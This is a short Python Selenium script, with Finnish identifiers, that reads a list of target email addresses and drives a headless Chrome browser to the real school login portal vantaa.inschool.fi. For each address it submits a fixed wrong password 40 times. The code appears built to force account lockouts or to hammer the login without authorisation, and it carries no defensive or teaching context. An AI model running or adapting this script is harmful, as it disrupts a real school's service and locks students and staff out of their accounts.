from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from time import sleep
from selenium.webdriver.chrome.options import Options
import argparse

parser = argparse.ArgumentParser("simple_example")
parser.add_argument("arg1", help="polku tiedostoon, jossa on lista kohteista", type=str)
args = parser.parse_args()

tied = args.arg1

file1 = open(tied, 'r')
Lines = file1.readlines()

passw = "asdjhasd2"

options = Options()
options.add_argument("--headless=new")
web = webdriver.Chrome(options=options)

web.get('https://vantaa.inschool.fi')

sleep(1)

for y in range(len(Lines)):
    email = Lines[y]
    for i in range(40):
        osoite = web.find_element(By.ID, "login-frontdoor")
        osoite.send_keys(email)
        salakala = web.find_element(By.ID, "password")
        salakala.send_keys(passw + Keys.ENTER)
        print(i)
web.quit()

